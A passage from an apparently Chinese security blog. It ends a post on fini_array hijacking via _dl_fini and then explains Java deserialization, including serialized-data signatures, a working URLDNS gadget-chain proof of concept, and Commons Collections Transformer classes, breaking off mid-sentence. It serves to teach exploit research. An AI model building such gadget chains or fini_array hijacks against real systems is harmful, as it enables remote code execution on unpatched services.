<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ff6e56accff</span> &lt;_dl_fini+<span class="number">447</span>&gt;    <span class="keyword">lea</span>    <span class="built_in">r15</span>, [<span class="built_in">rcx</span> + <span class="built_in">rdx</span>*<span class="number">8</span>]</span><br><span class="line"><span class="comment">;...</span></span><br><span class="line"><span class="number">0x7ff6e56acd10</span> &lt;_dl_fini+<span class="number">464</span>&gt;    <span class="keyword">call</span>   <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r15</span>]</span><br></pre></td></tr></table></figure>
<p>rdx 固定为 0 ，rcx 来自下面的代码片段。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ff6e56accda</span> &lt;_dl_fini+<span class="number">410</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">r15</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> + <span class="number">8</span>]      &lt;_DYNAMIC+<span class="number">88</span>&gt;</span><br><span class="line"><span class="number">0x7ff6e56accde</span> &lt;_dl_fini+<span class="number">414</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r13</span> + <span class="number">0x120</span>]  &lt;_DYNAMIC+<span class="number">80</span>&gt;</span><br><span class="line"><span class="number">0x7ff6e56acce5</span> &lt;_dl_fini+<span class="number">421</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r13</span>]</span><br><span class="line"><span class="number">0x7ff6e56acce9</span> &lt;_dl_fini+<span class="number">425</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> + <span class="number">8</span>]</span><br><span class="line"><span class="number">0x7ff6e56acced</span> &lt;_dl_fini+<span class="number">429</span>&gt;    <span class="keyword">add</span>    <span class="built_in">rcx</span>, <span class="built_in">r15</span>                      &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br></pre></td></tr></table></figure>
<p>r13 的值为一个指针，该指针在 <code>printf</code>
执行的栈上存在，可以控制 <code>[r13]</code> 为
<code>target_ptr - fini_array_addr</code> 从而劫持
<code>fini_array</code> 。</p>
]]></content>
  </entry>
  <entry>
    <title>Java 反序列化</title>
    <url>/2024/11/08/java-serialization/</url>
    <content><![CDATA[<h1 id="反序列化基础">反序列化基础</h1>
<p>Java
的序列化（Serialization）和反序列化（Deserialization）是将对象的状态转换为字节流并恢复的过程。这个过程使对象可以保存到文件、通过网络传输或保存到数据库中，并在稍后恢复成对象。
- <strong>序列化（Serialization）</strong>：将 Java
对象的状态转换为字节流的过程。这使得对象可以保存到文件、发送到其他 JVM
甚至通过网络传输。 -
<strong>反序列化（Deserialization）</strong>：将字节流转换回 Java
对象的过程。这允许恢复先前序列化的对象状态。 ## 序列化条件 要使 Java
对象可序列化，类必须实现 <code>java.io.Serializable</code>
接口。<strong>这个接口是一个标记接口（没有方法），它表明该类的对象可以被序列化</strong>。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>; <span class="comment">// 用于版本控制</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructors, getters, and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> -
<strong>serialVersionUID</strong>：每个可序列化类建议定义一个
<code>serialVersionUID</code> 字段，用于版本控制。不同的
<code>serialVersionUID</code>
表示类的不同版本，如果序列化和反序列化的版本不匹配会抛出
<code>InvalidClassException</code>。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure></div> - <strong>transient
关键字</strong>：声明为 <code>transient</code>
的字段不会被序列化。它用于避免序列化敏感信息或不需要保存的字段。这种字段反序列化后为默认值（如
<code>null</code>）。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String password; <span class="comment">// 密码不会被序列化</span></span><br></pre></td></tr></table></figure></div> -
<strong>静态字段</strong>：静态字段属于类，而不是实例，因此不会被序列化。
-
<strong>对象图的完整性</strong>：序列化对象时，会递归地序列化其引用的所有对象。因此，引用对象也必须是可序列化的，否则会抛出
<code>NotSerializableException</code>。</p>
<h2 id="序列化接口">序列化接口</h2>
<h3 id="序列化基本用法">序列化基本用法</h3>
<ul>
<li><p><strong>序列化对象</strong>：使用 <code>ObjectOutputStream</code>
将对象写入（<code>writeObject</code> 方法）到输出流（如文件输出流）。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(hashMap);</span><br></pre></td></tr></table></figure></div></p></li>
<li><p><strong>反序列化对象</strong>：使用
<code>ObjectInputStream</code>
从输入流（如文件输入流）读取（<code>readObject</code> 方法）对象。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">hashMap = (HashMap)objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div> ### 自定义序列化</p></li>
<li><p><strong>自定义序列化</strong>：通过实现 <code>writeObject</code>
和 <code>readObject</code>
方法，可以自定义序列化和反序列化的行为。<strong>通常精心构造的序列化对象和
readObject 的自定义操作结合就可以造成反序列化漏洞。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    out.defaultWriteObject(); <span class="comment">// 默认序列化</span></span><br><span class="line">    <span class="comment">// 额外的序列化逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    in.defaultReadObject(); <span class="comment">// 默认反序列化</span></span><br><span class="line">    <span class="comment">// 额外的反序列化逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong>Externalizable 接口</strong>：<code>Externalizable</code>
是 <code>Serializable</code> 的子接口，它强制实现
<code>writeExternal</code> 和 <code>readExternal</code>
方法，提供完全控制序列化过程的能力。这对性能优化或定制序列化格式非常有用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须有无参数构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        name = (String) in.readObject();</span><br><span class="line">        age = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="反序列化功能特征">反序列化功能特征</h2>
<h3
id="压缩特征压缩后一些数据格式改变">压缩特征（压缩后一些数据格式改变）</h3></li>
<li><p>zip 格式特征：<code>PK*</code></p></li>
<li><p>zip+base64：<code>UE*</code></p></li>
<li><p>gzip+base64：<code>H4s*</code> ###
反序列化数据特征(数据内容+请求类型)</p></li>
<li><p><code>AC ED 00 05</code> in Hex</p></li>
<li><p><code>rO0</code> in Base64</p></li>
<li><p><code>Content-type = ‘application/x-java-serialized-object</code>
## 反序列化利用（URLDNS 为例） URLDNS 反序列化利用链可以通过 DNS
请求来验证反序列化漏洞的可利用性。这条利用链使用 Java
内置的类构造，对第三方库没有依赖，可以在没有回显的情况下验证是否存在反序列化漏洞。我们可以在
<a class="link"   href="https://requestrepo.com/" >https://requestrepo.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
网站上进行 DNS 请求测试。 ### 测试代码 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://www.example.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// 防止提前触发影响观察现象</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ### 利用链分析
调用栈如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">getHostAddress:436, URLStreamHandler (java.net)</span><br><span class="line">hashCode:353, URLStreamHandler (java.net)</span><br><span class="line">hashCode:878, URL (java.net)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br></pre></td></tr></table></figure></div> 首先在 <code>HashMap.readObject</code>
中会遍历 <code>HashMap</code> 的成员并对 <code>key</code> 调用
<code>HashMap.hash</code> 函数计算 hash。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">    	...</span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);	<span class="comment">//	&lt;-- 调用 hash 函数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>HashMap.hash</code> 函数中会调用 <code>key</code> 的
<code>hashCode</code> 方法，也就是 <code>URL.hashCode</code>。</p></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>URL.hashCode</code> 函数中，由于我们设置 <code>url</code>
对象的 <code>hashCode</code> 成员值为 -1，因此会调用
<code>URLStreamHandler.hashCode</code> 函数。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>URLStreamHandler.hashCode</code> 函数会调用
<code>getHostAddress</code> 函数获取 URL 对应的 ip 地址，也就会发送 DNS
请求。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> # CommonCollections 系列 ## Commons Collections
概述</p>
<p>Apache Commons Collections 是⼀个著名的辅助开发库，包含了一些 Java
中没有的数据结构和和辅助方法，不过随着 Java 9
以后的版本中原生库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p>
<p>在 2015 年底 commons-collections 反序列化利用链被提出时，Apache
Commons Collections 有以下两个分支版本： -
<code>commons-collections:commons-collections</code> -
<code>org.apache.commons:commons-collections4</code></p>
<p>前者是 Commons Collections 老的版本包，当时版本号是
3.2.1；后者是官方在 2013 年推出的 4 版本，当时版本号是 4.0。</p>
<p>因为官方认为旧的 commons-collections 有⼀些架构和 API
设计上的问题，但修复这些问题，会产生大量不能向前兼容的改动。所以，commons-collections4
不再认为是一个用来替换 commons-collections
的新版本，而是一个新的包，两者的命名空间不冲突，因此可以共存在同一个项目中。
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons/collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons/collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div> ## Transformer <code>Transformer</code>
是一个接口，具体代码如下，可以看到这个接口只有一个
<code>transform</code> 方法。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>Transformer</code>
可以说是 CC 链的核心，<del>几乎</del>所有的 CC 链都依赖于
<code>Transformer</code>。我们可以简单的把 CC 链总结为： -
先寻找一个类，这个类自定义的 <code>readObject</code>
方法会直接或间接的触发<strong>对指定 <code>Transformer</code> 对象调用
<code>transform</code> 方法</strong>的代码。 - 由于我们可以用一系列
<code>Transformer</code> 接口实现类实现代码执行流的完全控制，因此当调用
<code>transform</code> 方法的时候，就可以执行我们的恶意代码。 ### 调用
transform 方法的对象 #### TransformedMap <code>TransformedMap</code>
用于对 Java 标准数据结构 Map 做一个修饰，被修饰过的 <code>Map</code>
在添加（写入操作）新的元素时，将可以执行一个回调。我们通过下面这行代码对
<code>innerMap</code> 进行修饰，传出的 <code>outerMap</code>
即是修饰后的 <code>Map</code>： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,</span><br><span class="line">valueTransformer);</span><br></pre></td></tr></table></figure></div> 被修饰后的
<code>outerMap</code> 在转换 <code>Map</code> 的新元素时，就会调用
<code>transform</code>
方法，这个过程就类似在调用⼀个“回调函数”，这个回调的参数是原始对象。</p>
<p>例如 <code>TransformedMap.put</code> 方法： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 另外对
<code>TransformedMap</code> 内部成员调用 <code>setValue</code>
时也会调用 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="lazymap">LazyMap</h4>
<p><code>LazyMap</code> 和 <code>TransformedMap</code> 类似，都来自于
Common-Collections 库，并继承 <code>AbstractMapDecorator</code>。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></div> 在 Common-Collections4 中 <code>decorate</code> 方法改为
<code>lazyMap</code>： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain)</span><br></pre></td></tr></table></figure></div> <code>LazyMap</code>
的漏洞触发点和 <code>TransformedMap</code>
唯一的差别是，<code>TransformedMap</code> 是在写入元素的时候执行
<code>transform</code>，而 <code>LazyMap</code> 是在其 <code>get</code>
方法中执行的 <code>factory.transform</code>。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 注意
<code>LazyMap</code> 是在其 <code>get</code> 方法中执行的
<code>factory.transform</code> 的条件是 <code>LazyMap</code>
没有当前查询的 <code>key</code>，也就是说对于一个特定的
<code>key</code>，我们只能调用一次 <code>transform</code> 。除非调用
<code>Map.clear</code> 方法清空 <code>LazyMap</code> 。 ####
TransformingComparator <code>TransformingComparator</code> 实现了
<code>java.util.Comparator</code>
接口，这个接口用于定义两个对象如何进行比较。对于一些需要维护顺序的数据结构（如
<code>java.util.PriorityQueue</code>），如果传入
<code>TransformingComparator</code>
用于两个对象的比较，那么比较两个对象的时候会调用
<code>TransformingComparator</code> 的 <code>compare</code> 方法。在
<code>compare</code> 方法内部会调用其中 <code>transformer</code> 成员的
<code>transform</code> 方法并传入进行比较的对象。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>TransformingComparator</code> 的构造函数如下，这里的
<code>transformer</code> 就是我们构造的 <code>Transformer</code>
结构，另外 <code>decorated</code> 如果不指定会传入
<code>new ComparableComparator()</code> 。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, <span class="keyword">new</span> <span class="title class_">ComparableComparator</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer, Comparator decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ###
Transformer 的接口实现类 #### ConstantTransformer
<code>ConstantTransformer</code> 在构造函数的时候传入一个对象，并在
